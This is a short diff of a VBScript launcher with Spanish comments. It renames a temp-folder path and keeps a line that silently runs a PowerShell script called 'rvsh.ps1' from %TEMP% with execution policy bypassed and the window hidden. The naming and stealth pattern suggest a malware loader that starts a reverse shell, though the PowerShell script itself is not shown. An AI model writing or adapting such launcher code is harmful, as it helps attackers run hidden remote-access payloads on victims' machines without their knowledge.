@@ -5,6 +5,6 @@ Set FileSystemObject = CreateObject("Scripting.FileSystemObject")
 tempPath = WshShell.ExpandEnvironmentStrings("%TEMP%")
 
 ' Se construye la ruta completa al script PowerShell
-ps1Path = tempPath & "\edge-data\rvsh.ps1"
+ps1Path = tempPath & "\data_SP\rvsh.ps1"
 
 WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -File """ & ps1Path & """", 0, True
